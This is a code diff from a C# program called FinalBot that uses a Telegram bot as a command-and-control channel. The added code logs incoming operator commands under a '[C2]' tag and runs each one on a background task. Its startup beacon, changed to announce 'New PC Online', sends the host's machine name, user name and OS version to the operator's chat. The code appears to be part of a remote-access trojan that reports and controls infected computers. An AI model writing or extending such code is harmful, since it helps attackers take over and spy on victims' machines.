@@ -58,31 +58,43 @@ namespace FinalBot
 
         private async Task HandleUpdateAsync(ITelegramBotClient botClient, Update update, CancellationToken cancellationToken)
         {
-            if (update.Message is { } message)
+            _ = Task.Run(async () =>
             {
-                if (message.From?.Id.ToString() != _adminId) return;
-                await _commandHandler.HandleCommand(message);
-            }
-            else if (update.CallbackQuery is { } callbackQuery)
-            {
-                if (callbackQuery.From?.Id.ToString() != _adminId) return;
-                await _commandHandler.HandleCallbackQuery(callbackQuery);
-            }
+                try
+                {
+                    if (update.Message is { } message)
+                    {
+                        if (message.From?.Id.ToString() != _adminId) return;
+                        Logger.Info($"[C2] Command: {message.Text}");
+                        await _commandHandler.HandleCommand(message);
+                    }
+                    else if (update.CallbackQuery is { } callbackQuery)
+                    {
+                        if (callbackQuery.From?.Id.ToString() != _adminId) return;
+                        Logger.Info($"[C2] Callback: {callbackQuery.Data}");
+                        await _commandHandler.HandleCallbackQuery(callbackQuery);
+                    }
+                }
+                catch (Exception ex)
+                {
+                    Logger.Error("Exception while handling Telegram update", ex);
+                }
+            }, cancellationToken);
         }
 
         private Task HandlePollingErrorAsync(ITelegramBotClient botClient, Exception exception, CancellationToken cancellationToken)
         {
-            Console.WriteLine($"[POLLING ERROR] {exception.Message}");
+            Logger.Error($"[POLLING ERROR]", exception);
             return Task.CompletedTask;
         }
 
         private async Task SendStartupReport()
         {
-            string info = $"🚀 *FinalBot C# v1.0 Online*\n" +
-                          $"🖥️ *PC:* {Environment.MachineName}\n" +
-                          $"👤 *User:* {Environment.UserName}\n" +
-                          $"🌐 *OS:* {Environment.OSVersion}\n" +
-                          $"⏰ *Time:* {DateTime.Now:yyyy-MM-dd HH:mm:ss}";
+            string info = $"🚀 New PC Online\n" +
+                          $"🖥️ PC:{Environment.MachineName}\n" +
+                          $"👤 User: {Environment.UserName}\n" +
+                          $"🌐 OS: {Environment.OSVersion}\n" +
+                          $"⏰ Time: {DateTime.Now:yyyy-MM-dd HH:mm:ss}";
 
             await _botClient.SendTextMessageAsync(
                 chatId: _adminId,
